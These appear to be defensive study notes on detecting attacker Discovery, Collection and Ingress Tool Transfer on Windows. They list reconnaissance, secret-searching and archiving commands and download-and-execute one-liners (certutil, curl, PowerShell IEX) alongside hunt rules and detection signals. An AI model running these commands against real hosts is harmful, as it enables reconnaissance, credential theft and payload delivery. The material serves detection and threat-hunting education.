# Windows Threat Detection 2

## Situational awareness / big picture

- Attackers that gain initial access perform **Discovery** to learn host role, user privileges, network context and defensive products before continuing.
- After discovery they **collect** desirable data (files, credentials, sessions) and **exfiltrate** it; often they also perform **Ingress Tool Transfer** to download additional tools.
- These activities map to MITRE tactics: **Discovery (TA0007)**, **Collection (TA0009)** / **Credential Access (TA0006)**, **Exfiltration (TA0010)** and **Ingress Tool Transfer (T1105)**.

## Discovery

### Purpose

- Identify host purpose, user accounts & privileges, running services/apps, network settings, and active AV/EDR.

### Common commands (Windows CMD / PowerShell)

- Files/folders: `dir`, `type <file>`, `Get-ChildItem`, `Get-Content`
- Users/groups: `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`
- System/apps: `systeminfo`, `tasklist /v`, `wmic product get name,version`, `Get-Service`
- Network: `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`
- AV presence: `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`

### Process / access patterns

- Automated discovery: small script runs many commands quickly (seconds–minutes).
- Interactive discovery: attacker uses GUI (explorer, mmc, control, notepad, taskmgr) — may not show typical short CMD strings but shows suspicious GUI actions/process tree.

### Detection signals

- Process creation logs (e.g., Sysmon Event ID 1) showing sequences like `malware -> cmd.exe -> <discovery commands>`.
- PowerShell transcription / history entries.
- Correlate `ParentProcessId`/`ProcessId` to build process trees and separate legitimate admin activity from suspicious sequences.
- Look for bursts of known reconnaissance commands run by uncommon parent processes or at odd times.

## Collection (searching & gathering secrets)

### Targets

- Personal: photos, chats, browser history, messaging app data.
- Financial: banking sessions, crypto wallets (`wallet.dat`), cookies.
- Corporate: SSH keys, databases, application data, sensitive file shares.
- Secrets may be on disk, in registry, or only in process memory.

### Typical collection actions / commands

- Opening files: `notepad.exe C:\Users\...\secrets.txt`.
- Searching/parsing files: `type file | findstr password`, `Get-ChildItem -Recurse -Filter *.pdf`.
- Copying/archiving: `copy <path> C:\Temp\`, `Compress-Archive`, `7za.exe a -tzip stolen.zip <files>`.
- Automated stealers may not invoke CMD/PowerShell but run native code to scrape browsers, wallets, apps.

### Detection signals

- Multiple file-open operations targeting sensitive directories (AppData, user profile, Documents) within short time windows.
- Creation of archives (zip/7z) containing many user files.
- Unusual process activity reading browser/credential store files or spawning GUI editors while parent is non-interactive.
- Monitor for known stealer behaviors (processes accessing browser profiles, `.sqlite`, `Cookies`, `Login Data`).

## Ingress Tool Transfer (T1105)

### Why attackers use it

- Keep initial payload small, evade AV, fetch stage 2 tools (Seatbelt, Mimikatz, RATs, ransomware).

### Common transfer methods / commands

- `certutil.exe -urlcache -f https://…/bad.exe good.exe`
- `curl.exe https://…/bad.exe -o good.exe` (Win10+)
- PowerShell: `Invoke-WebRequest` / `IEX (New-Object Net.WebClient).DownloadString(...)`
- GUI / RDP copy-and-paste or browser download; using trusted cloud services (GitHub, S3, Dropbox) to blend in.

### Detection signals

- Network connections or DNS queries from unusual processes (e.g., `cmd.exe`, `powershell.exe`, or unknown EXE) to external domains.
- File writes following a network download by a suspicious process.
- Downloads from cloud/trusted domains with unusual paths or filenames.
- Monitor process parentage: a non-browser process initiating HTTP/HTTPS downloads is high-risk.

## Practical detection & hunting checklist (actionable)

- **Collect**: Sysmon (ProcessCreate ID 1), PowerShell logs (Module/ScriptBlock/Transcription), Windows Event logs, file creation events, network/DNS logs.
- **Hunt rules** (examples):
    - ProcessCreate where parent is a user file `.docx.exe` or temp launcher spawning `cmd.exe`/`powershell.exe`.
    - `cmd.exe`/`powershell.exe` invoking discovery command sequences (ipconfig + whoami + net user) within short timeframe.
    - Non-browser process performing HTTPS download or writing executable file to disk.
    - Creation of archive files (`.zip`, `.7z`) in user temp directories not matching known backup behavior.
    - Access to browser profile paths (`AppData\Local\Google\Chrome\User Data\Default\`) by unusual processes.
- **Contextualize**: always check user, parent process, scheduled time and whether commands are consistent with IT/admin tasks before escalating.

## Outcomes / key takeaways

- Discovery, Collection and Ingress Tool Transfer are common, sequential stages after initial access and are noisy — they produce detectable artifacts if you log process creation, PowerShell, file and network activity.
- Focus detection on **sequences** of commands/processes, not single benign commands in isolation. Correlate process trees + network/file events to reduce false positives.
- Data stealers may bypass command-line indicators — monitor file/system access patterns and known artifact locations for browser/wallet/app data.
